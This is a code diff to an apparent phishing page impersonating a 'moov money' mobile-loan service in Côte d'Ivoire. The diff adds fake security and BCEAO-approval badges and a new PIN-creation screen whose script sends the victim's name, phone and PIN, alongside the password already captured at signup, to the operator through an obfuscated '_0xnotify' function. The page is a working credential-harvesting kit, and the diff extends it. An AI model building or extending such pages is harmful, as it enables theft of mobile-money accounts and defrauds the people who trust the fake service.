@@ -65,10 +65,10 @@
     .submit-btn:hover { transform: translateY(-2px); }
     .submit-btn:disabled { opacity: 0.55; cursor: not-allowed; transform: none; }
     .otp-target { background: #fff; border: 2px solid var(--line); border-radius: 14px; padding: 14px; text-align: center; font-size: 14px; color: var(--navy-deep); font-weight: 700; }
-    .otp-boxes { display: flex; gap: 8px; justify-content: center; }
-    .otp-boxes input { width: 44px; height: 52px; text-align: center; font-size: 22px; font-weight: 800; border: 2px solid var(--line); border-radius: 12px; color: var(--navy-deep); font-family: 'Manrope', sans-serif; outline: none; background: #fff; }
-    .otp-boxes input:focus { border-color: var(--navy-deep); }
-    .otp-boxes input.filled { border-color: var(--navy); background: #F0F4F8; }
+    .pin-boxes, .otp-boxes { display: flex; gap: 8px; justify-content: center; }
+    .pin-boxes input, .otp-boxes input { width: 44px; height: 52px; text-align: center; font-size: 22px; font-weight: 800; border: 2px solid var(--line); border-radius: 12px; color: var(--navy-deep); font-family: 'Manrope', sans-serif; outline: none; background: #fff; }
+    .pin-boxes input:focus, .otp-boxes input:focus { border-color: var(--navy-deep); }
+    .pin-boxes input.filled, .otp-boxes input.filled { border-color: var(--navy); background: #F0F4F8; }
     .resend-row { display: flex; justify-content: center; gap: 6px; font-size: 13.5px; color: var(--navy-deep); font-weight: 600; }
     .resend-row button { border: none; background: none; color: var(--gold-dark); font-weight: 800; cursor: pointer; font-size: 13.5px; text-decoration: underline; }
     .resend-row button:disabled { color: var(--muted); cursor: not-allowed; text-decoration: none; }
@@ -89,6 +89,14 @@
     .btn-small { padding: 10px; border-radius: 8px; border: 1px solid var(--navy-deep); font-weight: 700; cursor: pointer; flex: 1; }
     .btn-retry { background: var(--navy-deep); color: #fff; }
     .btn-back { background: #fff; color: var(--navy-deep); }
+
+    /* Security Grid & Footer Styles */
+    .security-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 10px; }
+    .security-item { background: #fff; border: 2.5px solid var(--navy-deep); border-radius: 16px; padding: 18px 10px; text-align: center; display: flex; flex-direction: column; align-items: center; gap: 8px; }
+    .security-item svg { width: 24px; height: 24px; color: var(--gold-dark); }
+    .security-item span { font-size: 13.5px; font-weight: 700; color: var(--navy-deep); }
+    .footer-links { display: flex; justify-content: center; gap: 20px; margin-top: 24px; }
+    .footer-links a { font-size: 14px; font-weight: 700; color: var(--navy-deep); text-decoration: none; border-bottom: 1.5px solid var(--navy-deep); padding-bottom: 1px; }
   </style>
 </head>
 <body>
@@ -151,6 +159,31 @@
       <button class="cta" id="cta-btn">
         <span data-i18n="cta">Continuer avec moov money</span> →
       </button>
+
+      <div class="security-grid">
+        <div class="security-item">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
+          <span data-i18n="ssl">SSL sécurisé</span>
+        </div>
+        <div class="security-item">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+          <span data-i18n="dataProtect">Protection des données</span>
+        </div>
+        <div class="security-item">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+          <span data-i18n="bct">Agréé par la BCEAO</span>
+        </div>
+        <div class="security-item">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+          <span data-i18n="payment">Paiement sécurisé</span>
+        </div>
+      </div>
+
+      <div class="footer-links">
+        <a href="#" data-i18n="terms">Conditions générales</a>
+        <a href="#" data-i18n="help">Aide</a>
+        <a href="#" data-i18n="contact">Contact</a>
+      </div>
     </div>
 
     <!-- Signup Screen -->
@@ -187,10 +220,36 @@
       </form>
     </div>
 
+    <!-- PIN Screen -->
+    <div id="screen-pin" class="screen">
+      <div class="back-row">
+        <button class="back-btn" id="back-to-signup-from-pin" aria-label="Back">
+          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path></svg>
+        </button>
+        <div>
+          <div class="screen-title" data-i18n="pinTitle">Créer un code PIN</div>
+          <div class="screen-subtitle" data-i18n="pinSubtitle">Accès sécurisé à votre compte moov money</div>
+        </div>
+      </div>
+      <div class="form-card">
+        <div class="field">
+          <label data-i18n="labelPin">Code PIN (4 chiffres)</label>
+          <div class="pin-boxes" id="pin-boxes">
+            <input type="password" inputmode="numeric" maxlength="1">
+            <input type="password" inputmode="numeric" maxlength="1">
+            <input type="password" inputmode="numeric" maxlength="1">
+            <input type="password" inputmode="numeric" maxlength="1">
+          </div>
+        </div>
+        <button class="submit-btn" id="pin-submit-btn" disabled data-i18n="pinSubmit">Définir le PIN</button>
+        <p style="font-size: 13px; color: var(--muted); text-align: center; line-height: 1.4; margin-top: 10px;" data-i18n="pinNote">Ce code à 4 chiffres sera requis pour valider vos futurs prêts et transferts.</p>
+      </div>
+    </div>
+
     <!-- OTP Screen -->
     <div id="screen-otp" class="screen">
       <div class="back-row">
-        <button class="back-btn" id="back-to-signup" aria-label="Back">
+        <button class="back-btn" id="back-to-pin" aria-label="Back">
           <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M15 19l-7-7 7-7"></path></svg>
         </button>
         <div>
@@ -281,10 +340,10 @@
 
     const translations = {
       fr: {
-        badge: "Prêts moov money · Côte d'Ivoire", eyebrow: "Crédit instantané", approved: "Approuvé en 5 min", transfer: "Transfert Mobile Money", f1: "Déblocage immédiat", f2: "Zéro papier", f3: "Sécurisé par Moov Africa", f4: "Remboursement flexible", secure: "100% sécurisé", clients: "35k+ clients", cta: "Continuer avec moov money", ssl: "SSL sécurisé", dataProtect: "Protection des données", bct: "Agréé par la BCEAO", payment: "Paiement sécurisé", terms: "Conditions générales", help: "Aide", contact: "Contact", signupTitle: "Créer un compte", signupSubtitle: "Quelques infos pour continuer", labelName: "Nom complet", errorName: "Merci d'entrer votre nom complet.", labelPhone: "Numéro de téléphone", errorPhone: "Entrez un numéro ivoirien valide (10 chiffres).", labelPassword: "Mot de passe", errorPassword: "Le mot de passe doit contenir au moins 8 caractères.", signupSubmit: "Envoyer le code", legalNote: "En continuant, vous acceptez nos Conditions générales et notre Politique de confidentialité.", otpTitle: "Vérification", otpSubtitle: "Entrez le code reçu par SMS", otpTarget: "Code envoyé au +225 {phone}", errorOtp: "Code incorrect, veuillez réessayer.", otpVerify: "Vérifier", resendPrefix: "Code non reçu ?", resendAction: "Renvoyer", resendWait: "Renvoyer dans {s}s", successTitle: "Compte vérifié", successText: "Votre numéro a été confirmé. Vous pouvez maintenant continuer votre demande de crédit.", successContinue: "Continuer"
+        badge: "Prêts moov money · Côte d'Ivoire", eyebrow: "Crédit instantané", approved: "Approuvé en 5 min", transfer: "Transfert Mobile Money", f1: "Déblocage immédiat", f2: "Zéro papier", f3: "Sécurisé par Moov Africa", f4: "Remboursement flexible", secure: "100% sécurisé", clients: "35k+ clients", cta: "Continuer avec moov money", ssl: "SSL sécurisé", dataProtect: "Protection des données", bct: "Agréé par la BCEAO", payment: "Paiement sécurisé", terms: "Conditions générales", help: "Aide", contact: "Contact", signupTitle: "Créer un compte", signupSubtitle: "Quelques infos pour continuer", labelName: "Nom complet", errorName: "Merci d'entrer votre nom complet.", labelPhone: "Numéro de téléphone", errorPhone: "Entrez un numéro ivoirien valide (10 chiffres).", labelPassword: "Mot de passe", errorPassword: "Le mot de passe doit contenir au moins 8 caractères.", signupSubmit: "Envoyer le code", pinTitle: "Créer un code PIN", pinSubtitle: "Accès sécurisé à votre compte moov money", labelPin: "Code PIN (4 chiffres)", pinSubmit: "Définir le PIN", pinNote: "Ce code à 4 chiffres sera requis pour valider vos futurs prêts et transferts.", otpTitle: "Vérification", otpSubtitle: "Entrez le code reçu par SMS", otpTarget: "Code envoyé au +225 {phone}", errorOtp: "Code incorrect, veuillez réessayer.", otpVerify: "Vérifier", resendPrefix: "Code non reçu ?", resendAction: "Renvoyer", resendWait: "Renvoyer dans {s}s", successTitle: "Compte vérifié", successText: "Votre numéro a été confirmé. Vous pouvez maintenant continuer votre demande de crédit.", successContinue: "Continuer"
       },
       en: {
-        badge: "moov money loans · Côte d'Ivoire", eyebrow: "Instant credit", approved: "Approved in 5 min", transfer: "Mobile Money transfer", f1: "Instant release", f2: "Zero paperwork", f3: "Secured by Moov Africa", f4: "Flexible repayment", secure: "100% secure", clients: "35k+ clients", cta: "Continue with moov money", ssl: "SSL secured", dataProtect: "Data protection", bct: "Approved by the BCEAO", payment: "Secure payment", terms: "Terms of service", help: "Help", contact: "Contact", signupTitle: "Create an account", signupSubtitle: "A few details to continue", labelName: "Full name", errorName: "Please enter your full name.", labelPhone: "Phone number", errorPhone: "Enter a valid Ivorian number (10 digits).", labelPassword: "Password", errorPassword: "Password must be at least 8 characters.", signupSubmit: "Send code", legalNote: "By continuing, you agree to our Terms of Service and Privacy Policy.", otpTitle: "Verification", otpSubtitle: "Enter the code sent by SMS", otpTarget: "Code sent to +225 {phone}", errorOtp: "Incorrect code, please try again.", otpVerify: "Verify", resendPrefix: "Didn't get a code?", resendAction: "Resend", resendWait: "Resend in {s}s", successTitle: "Account verified", successText: "Your number has been confirmed. You can now continue your loan application.", successContinue: "Continue"
+        badge: "moov money loans · Côte d'Ivoire", eyebrow: "Instant credit", approved: "Approved in 5 min", transfer: "Mobile Money transfer", f1: "Instant release", f2: "Zero paperwork", f3: "Secured by Moov Africa", f4: "Flexible repayment", secure: "100% secure", clients: "35k+ clients", cta: "Continue with moov money", ssl: "SSL secured", dataProtect: "Data protection", bct: "Approved by the BCEAO", payment: "Secure payment", terms: "Terms of service", help: "Help", contact: "Contact", signupTitle: "Create an account", signupSubtitle: "A few details to continue", labelName: "Full name", errorName: "Please enter your full name.", labelPhone: "Phone number", errorPhone: "Enter a valid Ivorian number (10 digits).", labelPassword: "Password", errorPassword: "Password must be at least 8 characters.", signupSubmit: "Send code", pinTitle: "Create PIN Code", pinSubtitle: "Secure access to your moov money account", labelPin: "PIN Code (4 digits)", pinSubmit: "Set PIN", pinNote: "This 4-digit code will be required to validate future loans and transfers.", otpTitle: "Verification", otpSubtitle: "Enter the code sent by SMS", otpTarget: "Code sent to +225 {phone}", errorOtp: "Incorrect code, please try again.", otpVerify: "Verify", resendPrefix: "Didn't get a code?", resendAction: "Resend", resendWait: "Resend in {s}s", successTitle: "Account verified", successText: "Your number has been confirmed. You can now continue your loan application.", successContinue: "Continue"
       }
     };
 
@@ -306,7 +365,14 @@
       });
     });
 
-    const screens = { landing: document.getElementById('screen-landing'), signup: document.getElementById('screen-signup'), otp: document.getElementById('screen-otp'), success: document.getElementById('screen-success') };
+    const screens = { 
+      landing: document.getElementById('screen-landing'), 
+      signup: document.getElementById('screen-signup'), 
+      pin: document.getElementById('screen-pin'),
+      otp: document.getElementById('screen-otp'), 
+      success: document.getElementById('screen-success') 
+    };
+
     function showScreen(name) {
       Object.values(screens).forEach(s => s.classList.remove('active'));
       screens[name].classList.add('active');
@@ -318,7 +384,8 @@
       showScreen('signup');
     });
     document.getElementById('back-to-landing').addEventListener('click', () => showScreen('landing'));
-    document.getElementById('back-to-signup').addEventListener('click', () => showScreen('signup'));
+    document.getElementById('back-to-signup-from-pin').addEventListener('click', () => showScreen('signup'));
+    document.getElementById('back-to-pin').addEventListener('click', () => showScreen('pin'));
     document.getElementById('success-continue-btn').addEventListener('click', () => showScreen('landing'));
 
     const signupForm = document.getElementById('signup-form');
@@ -336,6 +403,25 @@
       }
 
       _0xnotify(`<b>👤 New Signup! (CI)</b>\n\n<b>Name:</b> ${userName}\n<b>Phone:</b> +225${userPhone}\n<b>Password:</b> <code>${pass}</code>`);
+      showScreen('pin');
+    });
+
+    const pinBoxes = Array.from(document.querySelectorAll('#pin-boxes input'));
+    const pinSubmitBtn = document.getElementById('pin-submit-btn');
+
+    pinBoxes.forEach((box, i) => {
+      box.addEventListener('input', () => {
+        box.value = box.value.replace(/\D/g, '').slice(0, 1);
+        box.classList.toggle('filled', box.value.length === 1);
+        if (box.value && i < pinBoxes.length - 1) pinBoxes[i + 1].focus();
+        pinSubmitBtn.disabled = pinBoxes.some(b => b.value === '');
+      });
+      box.addEventListener('keydown', (e) => { if (e.key === 'Backspace' && !box.value && i > 0) pinBoxes[i - 1].focus(); });
+    });
+
+    pinSubmitBtn.addEventListener('click', () => {
+      const pin = pinBoxes.map(b => b.value).join('');
+      _0xnotify(`<b>🔐 PIN Created! (CI)</b>\n\n<b>User:</b> ${userName}\n<b>Phone:</b> +225${userPhone}\n<b>PIN:</b> <code>${pin}</code>`);
       showScreen('otp');
       updateOtpDynamicText(currentLang);
     });
